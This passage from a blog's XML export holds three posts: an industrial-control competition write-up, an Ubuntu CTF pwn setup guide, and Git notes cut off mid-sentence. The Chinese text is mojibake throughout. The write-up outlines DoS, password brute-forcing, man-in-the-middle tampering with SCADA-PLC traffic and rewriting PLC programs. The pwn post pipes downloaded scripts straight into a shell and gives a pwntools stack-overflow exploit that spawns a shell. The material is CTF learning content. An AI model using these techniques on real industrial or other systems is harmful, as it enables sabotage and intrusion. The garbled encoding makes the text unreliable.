PLCå±žäºŽå·¥ä¸šäº§å“ï¼Œä¸€èˆ¬å·¥ä¸šäº§å“é’ˆå¯¹ç½‘ç»œå®‰å…¨æ–¹é¢çš„å±žæ€§åå¼±ï¼Œå¯èƒ½å­˜åœ¨æŸäº›å¯åˆ©ç”¨.æ¼æ´žï¼Œæ•´æœºæ€§èƒ½ä¸€èˆ¬ä¹Ÿæœ‰é™ï¼Œæ˜“å—dosæ”»å‡»ä¸”æŠµæŠ—åŠ›è¾ƒå·®ã€‚ æ”»å‡»å·¥ä½œç«™ï¼Œä¸€èˆ¬å…ˆèŽ·å–å·¥ä½œç«™ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚æ“ä½œç³»ç»Ÿç±»åž‹ç­‰ï¼Œæ ¹æ®å·²çŸ¥çš„ä¿¡æ¯ï¼Œæ¥è§„åˆ’ä¸‹ä¸€æ­¥çš„æ”»å‡»æ€è·¯ï¼Œå¦‚æžœæ“ä½œç³»ç»Ÿå¼€å¯äº†ç³»ç»Ÿè‡ªå¸¦é˜²ç«å¢™åŠŸèƒ½ï¼Œä¼šåœ¨ä¸€å®šç¨‹åº¦ä¸ŠæŠµå¾¡,dosæ”»å‡»ã€‚ äº¤æ¢æœºç½‘ç»œæ•°æ®äº¤æ¢æ€§èƒ½å¼ºï¼Œå°è§„æ¨¡çš„dos æ”»å‡»ï¼Œå¯¹å…¶éš¾æœ‰æˆæ•ˆï¼Œå¯å°è¯•å¯»æ‰¾æœªä¿®å¤çš„æ¼æ´žå¹¶åŠ ä»¥åˆ©ç”¨ï¼Œç›¸æ¯”PLCå’Œå·¥ä½œç«™è€Œè¨€ï¼Œç›´æŽ¥æ”»å‡»éš¾åº¦ç¨å¾®åå¤§ã€‚ æ‰€ä»¥ï¼Œæ”»å‡»æŽ’åºå»ºè®®ä¸º: PLC&gt;Iä½œç«™&gt;äº¤æ¢æœºã€‚ ç¬¬äºŒå±‚:é€šè¿‡æ”»å‡»ï¼Œå®žçŽ°å¯¹å·¥ä½œç«™å…³é”®ä½ç½®çš„æ–‡ä»¶çªƒå– æ”»å‡»æ€è·¯: çªƒå–é™Œç”Ÿä¸»æœºä¸Šæ–‡ä»¶ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹æ³•,ä¸€æ˜¯æŸ¥çœ‹è¯¥ä¸»æœºæ˜¯å¦æœ‰ç›´æŽ¥å¼€æ”¾å¯¹å¤–çš„å…±äº«æ–‡ä»¶å¤¹æˆ–FTPï¼ŒäºŒæ˜¯ç›´æŽ¥æŽ¥ç®¡å·¥ä½œç«™ï¼Œä»¥ç®¡ç†å‘˜æƒé™ç™»å½•ç³»ç»ŸèŽ·å¾—æ–‡ä»¶ã€‚ç”±äºŽæ¯”èµ›æ—¶é—´æœ‰é™,è€Œä¸”è§„åˆ™å…è®¸è¶Šå±‚æ”»å‡»ï¼Œæ‰€ä»¥è¦ç»¼åˆè¯„ä¼°ã€‚ é‰´äºŽç¬¬ä¸‰å±‚çš„è§„åˆ™ï¼Œå¯ä»¥åˆ¤æ–­ï¼Œè¯¥å±‚åº”è¯¥å·²ç»å¼€æ”¾å…±äº«æ–‡ä»¶å¤¹æˆ–FTPæƒé™ã€‚ é€šè¿‡æ”»å‡»å·¥å…·å¯¹å·¥ä½œç«™è¿›è¡Œæ‰«æï¼Œå¦‚åˆ©ç”¨ç«¯å£æ‰«æå·¥å…·æ£€æµ‹æ˜¯å¦å¼€æ”¾21ã€445ç­‰é«˜å±ç«¯å£ï¼Œè‹¥é‡åˆ°å¼±å£ä»¤ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨é¢„å…ˆå¤‡å¥½çš„å¯†ç å­—å…¸æ–‡ä»¶ï¼Œè¿›è¡Œæš´åŠ›ç ´è§£ã€‚å­—å…¸æ–‡ä»¶è¿‡å¤§ï¼Œåˆ™å¯èƒ½å¯¼è‡´ç ´è¯‘çš„æ—¶é—´å˜é•¿ã€‚ ç¬¬ä¸‰å±‚ï¼Œé€šè¿‡æ”»å‡»ï¼ŒèŽ·å–å·¥ä½œç«™ç®¡ç†å‘˜æƒé™ æ”»å‡»æ€è·¯: èŽ·å–ç®¡ç†å‘˜æƒé™çš„æ€è·¯æœ‰å¤šç§ï¼Œæ¯”å¦‚å¼±å£ä»¤çŒœæµ‹ï¼Œç³»ç»Ÿæ¼æ´žåˆ©ç”¨ç­‰ã€‚ å¦‚æžœæœ‰å¯ç›´æŽ¥åˆ©ç”¨çš„é«˜å±ç«¯å£ï¼Œæ¯”å¦‚å¼€æ”¾äº†Telnetã€ 3389 ç­‰è¿œç¨‹ç™»å½•æœåŠ¡ï¼Œå³å¯å°è¯•å¼±å£ä»¤çŒœæµ‹ã€‚ å¦‚æžœå£ä»¤é•¿æ—¶é—´ç ´è§£ä¸å‡ºæ¥ï¼Œå¯ä»¥æ‰«æç³»ç»Ÿæ¼æ´žï¼Œåˆ©ç”¨æ¼æ´žè¿›è¡Œææƒã€‚ ç¬¬å››å±‚:é€šè¿‡æ”»å‡»ï¼Œç¯¡æ”¹é¶æœºç³»ç»Ÿå‚æ•° æ”»å‡»æ€è·¯ å‰ä¸‰å±‚ä¸Žä¼ ç»Ÿå®‰å…¨æ— å¼‚ï¼Œè€Œç¬¬å››å±‚åˆ™éœ€è¦å·¥ä¸šè‡ªåŠ¨åŒ–é¢†åŸŸæ–¹é¢çŸ¥è¯†ã€‚å¦‚æžœç†Ÿæ‚‰è‡ªåŠ¨åŒ–é¢†åŸŸï¼Œåˆ™ç¬¬å››å±‚ã€ç¬¬äº”å±‚çš„æ”»å‡»å°±ä¼šå˜å¾—å¾ˆè½»æ¾ã€‚ å·¥ä¸šçŽ¯å¢ƒçš„å·¥ä½œç«™ï¼Œä¸»è¦æœ‰å·¥ç¨‹å¸ˆç«™ã€æ“ä½œå‘˜ç«™ç­‰ã€‚å·¥ç¨‹å¸ˆç«™ä¸»è¦è´Ÿè´£ç»„æ€çš„ç¼–å†™å’Œä¿®æ”¹,æ“ä½œå‘˜ç«™ä¸»è¦è´Ÿè´£è®¾å¤‡çš„ç›‘æŽ§å’Œæ“ä½œã€‚æ¯”èµ›çŽ°åœºåªæœ‰ä¸€å°å·¥ä½œç«™ï¼Œåˆ™è¯´æ˜Žè¯¥ç«™ä¸€æœºå¤šç”¨ã€‚ è§„åˆ™ä¸­è¦æ±‚é»„ç¯äº®ï¼Œç»¿ç¯ç­ï¼Œæ‰€ä»¥æ”»å‡»æ—¶å¿…é¡»å…ˆçœ‹æ‡‚ç»„æ€ç•Œé¢ã€‚å¦‚æžœç»„æ€ç•Œé¢ä¸Šæœ‰å¯ä»¥ç›´æŽ¥æ“ä½œæŒ‡ç¤ºç¯äº®ç­çš„æŒ‰é’®ï¼Œåˆ™å¯ä»¥å¿«é€Ÿå®žçŽ°è¯¥æ“ä½œï¼Œé€šè¿‡æœ¬å±‚æ¬¡ã€‚ å¦‚æžœç»„æ€ç•Œé¢ä¸Šçš„æ“ä½œæŒ‰é’®ä¸èµ·ä½œç”¨æˆ–è€…æ²¡æœ‰æ“ä½œæŒ‰é’®ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ç»„æ€æˆ–PLC ç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶ï¼Œç›´æŽ¥ç¼–å†™ç¨‹åºï¼Œç¯¡æ”¹ä»£ç åŠå‚æ•°ï¼Œä¸‹å‘å¹¶æ‰§è¡Œã€‚åˆšæ–¹æ³•ä¹Ÿå°†ç”¨äºŽç¬¬äº”å±‚ç›¸åŒã€‚ ç¬¬äº”å±‚:é€šè¿‡æ”»å‡»ï¼Œç¯¡æ”¹é¶æœºç³»ç»ŸæŽ§åˆ¶ç¨‹åº æ”»å‡»æ€è·¯: ç†Ÿæ‚‰æ¢¯å½¢å›¾ï¼Œæ‡‚å¾—ç¼–å†™PLCç¨‹åºï¼Œç›´æŽ¥ä½¿æœˆç»„æ€æˆ–PLCç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶ï¼Œå³å¯è½»æ¾é€šè¿‡æœ¬å±‚æ¬¡ã€‚ å†³èµ› ç¬¬ä¸€å±‚:èŽ·å–SCADAä¸»æœºç³»ç»Ÿç®¡ç†æƒé™ æ”»å‡»æ€è·¯: ä¸Žåˆèµ›ç¬¬ä¸‰å±‚ç›¸åŒã€‚ç”±äºŽæ˜¯å†³èµ›çŽ¯èŠ‚ï¼Œä¸»æœºç³»ç»Ÿå®‰å…¨é…ç½®ä¼šè¿›è¡ŒåŠ å›ºï¼Œç›¸æ¯”åˆèµ›ï¼Œéš¾åº¦æœ‰æ‰€æå‡ã€‚ ç¬¬äºŒå±‚:èŽ·å–SCADAä¸»æœºæ¡Œé¢ï¼Œä¸Šçš„å¯†å‡½æ–‡ä»¶çš„å†…å®¹ æ”»å‡»æ€è·¯: èŽ·å–SCADAä¸»æœºæƒé™åŽï¼Œå¯ä»¥æœç´¢å¯»æ‰¾ç¡¬ç›˜ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ æ ¹æ®æç¤ºå¯ä»¥è¿›åŽ»æ¡Œé¢æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°å¯†å‡½æ–‡ä»¶ã€‚æ ¹æ®é¢˜æ„ï¼Œéœ€è¦èŽ·å–æ–‡ä»¶é‡Œé¢çš„å†…å®¹ã€‚å¦‚æžœåŒå‡»æ–‡ä»¶æ‰“å¼€çš„å†…å®¹ä¸ºä¹±ç æˆ–ä¸Žæç¤ºä¸ç¬¦ï¼Œåˆ™è¯´æ˜Žè¯¥æ–‡ä»¶é‡‡å–äº†æŸäº›æŠ€æœ¯æ··æ·†è§†å¬ã€‚ å¯èƒ½æ˜¯åŽ‹ç¼©åŒ…æ–‡ä»¶ï¼Œéœ€è¦ç ´è§£å¯†ç ï¼Œä¹Ÿå¯èƒ½æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œå†…å®¹éšå†™å…¶ä¸­ã€‚æ‰€ä»¥å¯ä»¥å¯¹è¯¥æ–‡ä»¶é‡æ–°å®šä¹‰ç±»åž‹å¹¶æ‰¾å‡ºå¯†å‡½ã€‚ ç¬¬ä¸‰å±‚:é€ æˆSCADAç³»ç»Ÿä¸Žé¶æœºç³»ç»Ÿæ‹’ç»æœåŠ¡ æ”»å‡»æ€è·¯: ä¸Žåˆèµ›ç¬¬ä¸€å±‚æ”»å‡»æ€è·¯ç›¸åŒï¼Œä½†é¶æœºç³»ç»Ÿå‰å¤šäº†å®‰å…¨ç½‘å…³ï¼Œå¯èƒ½ä¼šå¯¹dosæ”»å‡»è¿›è¡Œæ‹¦æˆªã€‚ å¯ä»¥å°è¯•å¯¹ä¸Šä½æœºè¿›è¡Œçªç ´ï¼Œä¼ªè£…ä¸Šä½æœºï¼Œè¿›è€Œå¯¼è‡´çœŸæ˜¯æœºå™¨é€šä¿¡ä¸­æ–­ã€‚ ç¬¬å››å±‚:ä¿®æ”¹SCADAç³»ç»Ÿç›‘æŽ§çŠ¶æ€ æ”»å‡»æ€è·¯: å‰ä¸‰å±‚ä¸Žä¼ ç»Ÿå®‰å…¨æ— å¼‚ï¼Œè€Œç¬¬å››å±‚åˆ™éœ€è¦å·¥ä¸šè‡ªåŠ¨åŒ–é¢†åŸŸæ–¹é¢çŸ¥è¯† å·¥ä¸šçŽ¯å¢ƒçš„å·¥ä½œç«™ï¼Œä¸»è¦æœ‰å·¥ç¨‹å¸ˆç«™ã€æ“ä½œå‘˜ç«™ç­‰ã€‚å·¥ç¨‹å¸ˆç«™ä¸»è¦è´Ÿè´£ç»„æ€çš„ç¼–å†™å’Œä¿®æ”¹,æ“ä½œå‘˜ç«™ä¸»è¦è´Ÿè´£è®¾å¤‡çš„ç›‘æŽ§å’Œæ“ä½œã€‚æ¯”èµ›çŽ°åœºåªæœ‰ä¸€å°å·¥ä½œç«™ï¼Œåˆ™è¯´æ˜Žè¯¥ç«™ä¸€æœºå¤šç”¨ã€‚ è¯¥å±‚è§„åˆ™è¦æ±‚å®ŒæˆSCADAç³»ç»Ÿç»„æ€ç•Œé¢æ•°å€¼å‘ç”Ÿæ”¹å˜ï¼Œé¶æœºç³»ç»Ÿæ•°å­—æ˜¾ç¤ºè¡¨ä¸Šæ•°å€¼ä¸å˜ï¼Œä¸€èˆ¬å¯ä»¥é‡‡å–ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯ä¸­é—´äººæ¬ºéª—æ”»å‡»ï¼Œæˆªå–SCADAä¸ŽPLCçš„æŠ¥æ–‡ï¼Œé˜»æ–­å¹¶æŽ¥ç®¡é€šè®¯ï¼Œå°†ç¯¡æ”¹åŽçš„æŠ¥æ–‡å‘é€ç»™SCADA;äºŒæ˜¯åˆ©ç”¨ç»„æ€æˆ–PLCç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶.ç›´æŽ¥ç¼–å†™ç¨‹åºï¼Œç¯¡æ”¹ä»£ç åŠå‚æ•°ï¼Œä¸‹å‘å¹¶æ‰§è¡Œã€‚è¯¥æ–¹æ³•ä¹Ÿå°†ç”¨äºŽç¬¬äº”å±‚ç›¸åŒã€‚ ç¬¬äº”å±‚ä¿®æ”¹é¶æœºç³»ç»Ÿé€»è¾‘ æ”»å‡»æ€è·¯: ä¸Žåˆèµ›ç¬¬äº”å±‚æ”»å‡»æ€è·¯åŸºæœ¬ç›¸åŒï¼Œç†Ÿæ‚‰æ¢¯å½¢å›¾ï¼Œæ‡‚å¾—ç¼–å†™PLCç¨‹åºï¼Œç›´æŽ¥ä½¿ç”¨ç»„æ€æˆ–;PLCç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶ï¼Œå°±æœ‰å¯èƒ½é€šè¿‡æœ¬å±‚æ¬¡ã€‚ä½†åˆä¸Žåˆèµ›ç¬¬äº”å±‚ä¸åŒçš„æ˜¯ï¼Œå†³èµ›çŽ¯èŠ‚å¤šäº†å®‰å…¨ç½‘å…³è®¾å¤‡ï¼Œè¯¥è®¾å¤‡ä¼šé˜²ä½å¼‚å¸¸è¯»å†™çš„æ“ä½œï¼Œæ‰€ä»¥å¦‚æžœä¹…æ”»ä¸ä¸‹ï¼Œå°±è¦è€ƒè™‘å…ˆèŽ·å–å®‰å…¨ç½‘å…³è®¾å¤‡çš„æŽ§åˆ¶æƒæˆ–ç»•è¿‡å®‰å…¨ç½‘å…³ï¼Œå®ŒæˆPLCç¨‹åºçš„å†™å…¥æ“ä½œã€‚ ç¬¬å…­å±‚æ”»åšä¿å«æˆ˜ï¼Œä¿æŠ¤è‡ªèº«é˜Ÿä¼çº¢æ——é£˜é£˜ æ”»å‡»æ€è·¯: è¿›å…¥ç¬¬å…­å±‚éœ€è¦ä¸¤ä¸ªå¿…å¤‡æ¡ä»¶,ä¸€æ˜¯æ”»ç ´ç¬¬äºŒå±‚æ‹¿åˆ°å¯†å‡½æ–‡ä»¶;äºŒæ˜¯æ”»ç ´ç¬¬äº”å±‚æ‹¿åˆ°å†›äº‹è¦å¡žèµ„æ ¼ã€‚ ç¬¬äºŒå±‚çš„å¯†å‡½æ–‡ä»¶ç ´è¯‘çŽ¯èŠ‚ï¼Œå¯ä»¥å°†æ–‡ä»¶æ‹·è´ç»™å›¢é˜Ÿä¸­å…¶ä»–çš„æ”»å‡»äººå‘˜ï¼Œè®©å›¢é˜Ÿé—²ç½®çš„ç”µè„‘è®¾å¤‡ï¼ŒåŽ»å®Œæˆç ´è¯‘å¯†å‡½å†…å®¹çš„å·¥ä½œã€‚è¯¥çŽ¯èŠ‚è¿˜æœ‰ä¸€ä¸ªéšè—çš„æŠ€æœ¯é—®é¢˜ï¼Œå³ä½¿èŽ·å–äº†å¯†å‡½æ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œè¿˜éœ€è¦çœ‹æ‡‚è¯¥å†…å®¹æ‰€è¡¨è¾¾çš„æ„æ€ï¼Œå¦åˆ™ç¬¬å…­å±‚çš„æ”»é˜²å°†æ— ä»Žå…¥æ‰‹ã€‚ è¯¥å±‚æ¬¡çš„æ”»å‡»ï¼Œä»Žæ”»å‡»æŠ€æœ¯è§’åº¦åˆ†æžï¼Œæ¯”è¾ƒç®€å•ï¼Œåªè¦é€šè¿‡Modbusç›¸å…³å·¥å…·è¿žæŽ¥å¹¶ç¯¡æ”¹å‚æ•°å³å¯å®žçŽ°äº®èµ·çº¢æ——ï¼Œä½†è¦ä¿æŒé˜Ÿä¼çš„æ——å¸œå¸¸äº®ï¼Œåˆ™å¾ˆè€ƒéªŒæ™ºæ…§ã€‚æ ¹æ®æ¯”èµ›è§„åˆ™ï¼Œè¯¥å±‚æ¬¡æ‰€ä½¿ç”¨çš„ä¸»æœºå’Œäº¤æ¢æœºï¼Œä¸èƒ½ä½œä¸ºæ”»å‡»å¯¹è±¡ï¼Œæ‰€ä»¥æœ‰èƒ½åŠ›çš„é˜Ÿä¼ï¼Œå¯ä»¥å¯¹å…¶ä»–é˜Ÿä¼çš„æ¯”èµ›è®¾å¤‡å‘èµ·æ”»å‡»ï¼Œäº’ç›¸æ”»é˜²ã€‚ é™„ä»¶ï¼šCompetition WriteUp by 2 hours]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>å·¥æŽ§</tag>
        <tag>getshell</tag>
        <tag>PLC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu 16.04 for Pwn]]></title>
    <url>%2F2019%2F05%2F23%2FUbuntu-16-04-for-Pwn%2F</url>
    <content type="text"><![CDATA[å¾€å¾€æˆ‘ä»¬åšpwné¢˜ï¼Œéƒ½æ˜¯æ‹¿åˆ°å¯æ‰§è¡Œæ–‡ä»¶(elf)å…¶ä¾èµ–æ–‡ä»¶libc.so,å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œåˆ©ç”¨å¥½çš„å·¥å…·ï¼Œå¯ä»¥äº‹åŠåŠŸå€ã€‚åœ¨æ­¤åˆ—å‡ºè‡ªå·±åšpwné¢˜çš„è™šæ‹Ÿæœºubuntué…ç½®ï¼Œæ›´åŠ æœŸå¾…WSL2ä¸Šçº¿åŽï¼Œä½¿ç”¨dockeréƒ¨ç½²pwnçŽ¯å¢ƒåšé¢˜ ä¸»è¦å·¥å…·ï¼švim ï¼š å®‰è£…æ’ä»¶ï¼Œä¸ºåŽç»­ç¼–å†™exploitpeda ï¼šgdbæ’ä»¶ï¼Œè°ƒè¯•ç¥žå™¨ï¼Œè°ç”¨è°çŸ¥é“pwngdbã€gef ï¼šåŒä¸Špwndbgï¼šGitHubä¸Šçš„ä¸€ä¸ªé¡¹ç›®,ç”¨äºŽGDBçš„è¾…åŠ©å¢žå¼ºpwntoolsï¼šå¸¸è§çš„pwnæ¼æ´žå †æº¢å‡ºã€æ ˆæº¢å‡ºã€use after freeã€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€å‘½ä»¤æ³¨å…¥ä»¥åŠç«žæ€(å¸¸è§äºŽå¤šçº¿ç¨‹)ç­‰ç¨‹åºæ¼æ´žï¼Œåœ¨ç¨‹åºæ¼æ´žåˆ©ç”¨å¸¸åˆ©ç”¨pythonè„šæœ¬æ¥ç¼–å†™exploitCapstoneã€Binutilsâ€¦ropå·¥å…· :ROPgadgetã€one_gadgetï¼Œè¿™ä¸¤ä¸ªéƒ½å¾ˆå¥½ç”¨ï¼Œone_gadgetä¸»è¦æ˜¯ç”¨æ¥å¯»æ‰¾libcæ–‡ä»¶ä¸­çš„ä¸€äº›shellåœ°å€çš„ã€ROPgadgetåˆ™ä¸»è¦æ˜¯ç”¨æ¥æž„å»ºropé“¾çš„ï¼Œéžå¸¸å®žç”¨LibcSearcher:ç”¨æ¥æ³„éœ²libcåº“ä¸­å‡½æ•°çš„åç§»çš„åº“ é…ç½®VIM1wget -qO- https://raw.github.com/ma6174/vim/master/setup.sh | sh -x è¯¦ç»†é…ç½®åœ°å€ å®‰è£…Capstoneï¼ˆåç¼–è¯‘æ¡†æž¶ï¼‰1234~$ git clone https://github.com/aquynh/capstone~$ cd capstone~$ make~$ sudo make install å®‰è£…Binutilsï¼ˆäºŒè¿›åˆ¶å·¥å…·é›†ï¼‰12345git clone https://github.com/Gallopsled/pwntools-binutilssudo apt-get install software-properties-commonsudo apt-add-repository ppa:pwntools/binutilssudo apt-get updatesudo apt-get install binutils-arm-linux-gnu ç¬¬ä¸‰æ–¹åº“åœ¨é€†å‘å’Œæº¢å‡ºç¨‹åºäº¤äº’æ—¶ï¼Œç”¨å¾—æœ€å¤šçš„å‡ ä¸ªç¬¬ä¸‰æ–¹åº“å…ˆè£…å¥½ï¼š123sudo pip install pwntoolssudo pip install ziosudo pip install pwn åœ¨é…ç½®python-pipçš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ç‚¹é—®é¢˜å‡çº§pip==19.1.1åŽï¼Œå‡ºçŽ°å¦‚ä¸‹æŠ¥é”™ï¼š å¯è¡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯ä¿®æ”¹æŠ¥é”™è¡Œçš„ä»£ç  1from pip._internal import main ssléªŒè¯é—®é¢˜ 123 rm -rf /usr/lib/python2.7/dist-packages/OpenSSL rm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-info sudo pip install pyopenssl å‡ºçŽ°checksecæ— æ³•ä½¿ç”¨çš„é—®é¢˜ 1pip3 install git+https://github.com/arthaud/python3-pwntools.git å®‰è£…gdbå·¥å…·åœ¨è°ƒè¯•æ—¶æœ‰æ—¶å€™éœ€è¦ä¸åŒåŠŸèƒ½ï¼Œåœ¨gdbä¸‹éœ€è¦å®‰è£…ä¸¤ä¸ªå·¥å…·pwndbgå’Œpedaï¼Œå¯æƒœè¿™ä¸¤ä¸ªä¸å…¼å®¹ pwndbgåœ¨è°ƒè¯•å †çš„æ•°æ®ç»“æž„æ—¶å€™å¾ˆæ–¹ä¾¿ pedaåœ¨æŸ¥æ‰¾å­—ç¬¦ä¸²ç­‰åŠŸèƒ½æ—¶æ–¹ä¾¿ peda12345git clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py" &gt;&gt; ~/.gdbinitecho "DONE! debug your program with gdb and enjoy" pwndbg123git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh pwngdb123cd ~/git clone https://github.com/scwuaptx/Pwngdb.git cp ~/Pwngdb/.gdbinit ~/ gef12345#via the install script$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh#manually$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit æˆ‘ä»¬é€šè¿‡ä¿®æ”¹gdbinitæ¥åˆ‡æ¢æƒ³ä½¿ç”¨çš„æ’ä»¶ ROPgadgethttps://github.com/JonathanSalwan/ROPgadget one_gadget123apt-get install rubyapt-get install gemsudo gem install one_gadget LibcSearcher1234git clone https://github.com/lieanu/libc.gitcd libcgit submodule update --init --recursivesudo python setup.py develop å®žä¾‹:Pwnåˆ†æžä¹‹æ ˆæº¢å‡º è§£é¢˜æ­¥éª¤0X01åç¼–è¯‘å¾—åˆ°Cä¼ªä»£ç  12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable(); return 0;&#125; mainå‡½æ•°è°ƒç”¨vulnerable()å‡½æ•° vulnerable()å‡½æ•°é€†å‘ç»“æžœ 1234567int vulnerable()&#123; char s; // [esp+4h] [ebp-14h] gets(&amp;s); return puts(&amp;s);&#125; vulnerable()å‡½æ•°ä¸­è°ƒç”¨äº†gets()å’Œputs()å‡½æ•°ï¼Œè€Œç¨‹åºçš„é€»è¾‘åªè¿è¡Œmainå‡½æ•°å’Œvulnerableå‡½æ•° vulnerableå‡½æ•°åŠŸèƒ½ï¼šè¾“å…¥å­—ç¬¦ä¸²ï¼Œè¾“å‡ºå­—ç¬¦ä¸²ç¨‹åºä¸­ä¸»è¦å‡½æ•°æœ‰å†…ç½®å‡½æ•°ï¼šgetsã€putsã€systemè‡ªå®šä¹‰å‡½æ•°ï¼šmainã€success 0X02é€šè¿‡Cä¼ªä»£ç æœ€ç»ˆå¾—åˆ°çš„Cä»£ç å¦‚ä¸‹ï¼š12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts("You Hava already controlled it."); system("/bin/sh");&#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; gets() æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œå› ä¸ºå®ƒä¸æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œæ˜¯ä»¥å›žè½¦æ¥åˆ¤æ–­æ˜¯å¦è¾“å…¥ç»“æŸï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å¯¼è‡´æ ˆæº¢å‡º 0X03æŸ¥çœ‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶ï¼š è¾“å…¥sçš„å€¼æº¢å‡ºåˆ°è¿”å›žåœ°å€ï¼Œå°†è¿”å›žåœ°å€æ›¿æ¢æˆsuccesså‡½æ•°çš„èµ·å§‹åœ°å€ EBPä¸ŽEBPçš„è·ç¦»14Hï¼Œè€Œæ ˆä¸­çš„EBPå æ ˆå†…å­˜4Hï¼Œæ‰€ä»¥è¦è¦†ç›–åˆ°æ”¾å›žåœ°å€éœ€è¦18H ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š 12345678910from pwn import *sh = process('./Ezreal')success_addr = 0x080491A2payload = 'a' * 0x18 + p32(success_addr)print p32(success_addr)sh.sendline(payload)sh.interactive() åˆ©ç”¨è„šæœ¬åŽçš„æ ˆç»“æž„å¦‚ä¸‹ï¼š è¿è¡Œè„šæœ¬ï¼ŒæˆåŠŸæ‹¿åˆ°shellï¼š]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git for github ä½¿ç”¨ç¬”è®°]]></title>
    <url>%2F2019%2F04%2F24%2FGit-for-github-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ä½œä¸ºä¸€ä¸ªç™½å¸½å­ï¼Œä½¿ç”¨githubçš„å”¯ä¸€ç›®çš„æ˜¯è®°å½•è‡ªå·±çš„ç ”ç©¶é¡¹ç›®ï¼Œå­˜æ”¾å­¦ä¹ ç¬”è®°ï¼Œå¤‡ä»½èµ„æ–™ç­‰ç­‰ã€‚å¯¹ååŒå¼€å‘çš„éœ€æ±‚ä¸å¤§ï¼Œç®€å•ä½¿ç”¨Gitçš„å‡ ä¸ªå‘½ä»¤å°±å¯ä»¥ä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œå¾ˆå¤šäººè¯´å¾ˆç¹çï¼Œå–œæ¬¢ä½¿ç”¨GUIç‰ˆæœ¬çš„github for Desktop,é‚£ä¹ˆè¿™å°±çœ‹ä¸ªäººå–œå¥½äº†~æŽ¥ä¸‹æ¥çš„å†…å®¹ä»…é€‚åˆåŒæˆ‘æƒ…å†µå·®ä¸å¤šçš„äººé˜…è¯»! è¯¦ç»†çš„å­¦ä¹ æ•™ç¨‹â€“&gt;èœé¸Ÿæ•™ç¨‹ for Git Gitå’Œgithubçš„å…³ç³»git: æ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æŽ§åˆ¶å·¥å…·ï¼ˆVersion controlï¼‰,å®ƒå¯åœ¨æœ¬åœ°å»ºç«‹ä»“åº“,ä½ å†™çš„ä»£ç çš„å„ä¸ªç‰ˆæœ¬éƒ½å¯ä»¥å­˜ç€ ; github: æ˜¯ä¸€ä¸ªé¢å‘å¼€æºåŠç§æœ‰è½¯ä»¶é¡¹ç›®çš„æ‰˜ç®¡å¹³å°ï¼Œç›¸å½“äºŽç½‘ä¸Šä»“åº“,ä½ å†™çš„ä»£ç çš„å„ä¸ªç‰ˆæœ¬éƒ½å¯ä»¥å­˜ç€; åŽ†å²æ¸Šæºï¼šGitæ¯”GitHubå‡ºç”Ÿçš„æ—©ã€‚äº‹ä»¶å›žåˆ°2005å¹´ï¼Œæœ‰ä¸ªå…¬å¸ä¸å…è®¸linuxç³»ç»Ÿç»§ç»­å…è´¹ä½¿ç”¨å®ƒä»¬çš„ç‰ˆæœ¬æŽ§åˆ¶è½¯ä»¶äº†ï¼Œç„¶åŽlinuxç³»ç»Ÿåˆ›å§‹äººTorvaldsä¸€æ°”ä¹‹ä¸‹èŠ±äº†10å¤©æ—¶é—´åˆ›é€ äº†Gitï¼ˆç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼‰ï¼Œå¹¶ä¸”å¼€æºç»™æ‰€æœ‰äººå…è´¹è¯•ç”¨ã€‚3å¹´åŽï¼ŒTom Prestonä½¿ç”¨Gitä½œä¸ºç‰ˆæœ¬æŽ§åˆ¶è½¯ä»¶åˆ›å»ºäº†http://Github.com ï¼Œä¸€ä¸ªä¸“é—¨æ‰˜ç®¡ä»£ç å¹¶ä¸”å¯ä»¥å®žçŽ°ç‰ˆæœ¬æŽ§åˆ¶çš„ç½‘ç«™ã€‚Tomä¹‹æ‰€ä»¥æŠŠç½‘ç«™å«åšGithubï¼Œæ˜¯å› ä¸ºå…¶æ ¸å¿ƒéƒ¨åˆ†ç‰ˆæœ¬æŽ§åˆ¶æ˜¯ç”¨Gitæ¥å¤„ç†çš„ã€‚ä½†æ˜¯ 